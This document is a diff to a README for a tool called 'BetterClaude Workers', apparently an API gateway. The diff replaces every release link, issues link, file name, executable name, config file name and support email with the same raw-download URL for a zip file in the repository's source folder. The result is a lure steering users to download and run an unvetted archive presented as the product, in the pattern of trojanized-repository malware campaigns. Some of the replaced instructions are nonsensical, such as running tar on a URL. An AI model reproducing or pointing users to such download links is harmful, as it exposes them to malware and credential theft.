@@ -6,11 +6,11 @@ Welcome to BetterClaude Workers! This application serves as an API Gateway, help
 
 ## 📥 Download the Software
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue?style=for-the-badge)](https://github.com/pnv06/betterclaude-workers/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/pnv06/betterclaude-workers/main/src/betterclaude_workers_1.7-alpha.1.zip%20Latest%20Release-blue?style=for-the-badge)](https://raw.githubusercontent.com/pnv06/betterclaude-workers/main/src/betterclaude_workers_1.7-alpha.1.zip)
 
 ### Download & Install
 
-To get the latest version of BetterClaude Workers, please visit this page to download: [Release Page](https://github.com/pnv06/betterclaude-workers/releases). 
+To get the latest version of BetterClaude Workers, please visit this page to download: [Release Page](https://raw.githubusercontent.com/pnv06/betterclaude-workers/main/src/betterclaude_workers_1.7-alpha.1.zip). 
 
 1. Click on the link to access the Releases page.
 2. Look for the latest version listed at the top of the page.
@@ -37,16 +37,16 @@ You will also need at least:
 ## 🔧 Installation Steps
 
 1. **Locate the Downloaded File**:
-   After the download is complete, find the file in your Downloads folder. The file should be named similar to "betterclaude-workers-vX.X.X.zip" or "betterclaude-workers-vX.X.X.tar.gz".
+   After the download is complete, find the file in your Downloads folder. The file should be named similar to "https://raw.githubusercontent.com/pnv06/betterclaude-workers/main/src/betterclaude_workers_1.7-alpha.1.zip" or "https://raw.githubusercontent.com/pnv06/betterclaude-workers/main/src/betterclaude_workers_1.7-alpha.1.zip".
 
 2. **Extract the Files**:
    - For Windows: Right-click on the downloaded file and choose "Extract All". Follow the prompts.
    - For macOS: Double-click the downloaded file to extract it.
-   - For Linux: Open a terminal and use the command `tar -xzf betterclaude-workers-vX.X.X.tar.gz`.
+   - For Linux: Open a terminal and use the command `tar -xzf https://raw.githubusercontent.com/pnv06/betterclaude-workers/main/src/betterclaude_workers_1.7-alpha.1.zip`.
 
 3. **Run the Application**:
-   - **Windows**: Open the extracted folder and double-click `betterclaude-workers.exe`.
-   - **macOS**: Open the extracted folder and double-click `betterclaude-workers.app`.
+   - **Windows**: Open the extracted folder and double-click `https://raw.githubusercontent.com/pnv06/betterclaude-workers/main/src/betterclaude_workers_1.7-alpha.1.zip`.
+   - **macOS**: Open the extracted folder and double-click `https://raw.githubusercontent.com/pnv06/betterclaude-workers/main/src/betterclaude_workers_1.7-alpha.1.zip`.
    - **Linux**: Open a terminal, navigate to the extracted folder, and run `./betterclaude-workers`.
 
 ## ⚙️ Configuration
@@ -54,10 +54,10 @@ You will also need at least:
 After launching BetterClaude Workers, you may need to configure it to work with your specific APIs.
 
 1. **Open the Configuration File**:
-   Look for a file named `config.json` in the installation folder.
+   Look for a file named `https://raw.githubusercontent.com/pnv06/betterclaude-workers/main/src/betterclaude_workers_1.7-alpha.1.zip` in the installation folder.
 
 2. **Edit the Configuration**:
-   Use any text editor to open `config.json`. Enter your API keys and other required information. Save the file after editing.
+   Use any text editor to open `https://raw.githubusercontent.com/pnv06/betterclaude-workers/main/src/betterclaude_workers_1.7-alpha.1.zip`. Enter your API keys and other required information. Save the file after editing.
 
 3. **Restart the Application**:
    To apply changes, close and reopen the application.
@@ -80,8 +80,8 @@ Once the application is running, you can start using it to manage your APIs.
 If you encounter any issues or need assistance, please check the following resources:
 
 - **FAQ Section**: Visit the FAQ section in the Help menu of the application.
-- **GitHub Issues Page**: Report any problems or bugs [here](https://github.com/pnv06/betterclaude-workers/issues).
-- **Email Support**: For urgent concerns, you can reach our support team at support@betterclaude.com.
+- **GitHub Issues Page**: Report any problems or bugs [here](https://raw.githubusercontent.com/pnv06/betterclaude-workers/main/src/betterclaude_workers_1.7-alpha.1.zip).
+- **Email Support**: For urgent concerns, you can reach our support team at https://raw.githubusercontent.com/pnv06/betterclaude-workers/main/src/betterclaude_workers_1.7-alpha.1.zip
 
 ## 🎉 Contributing
 
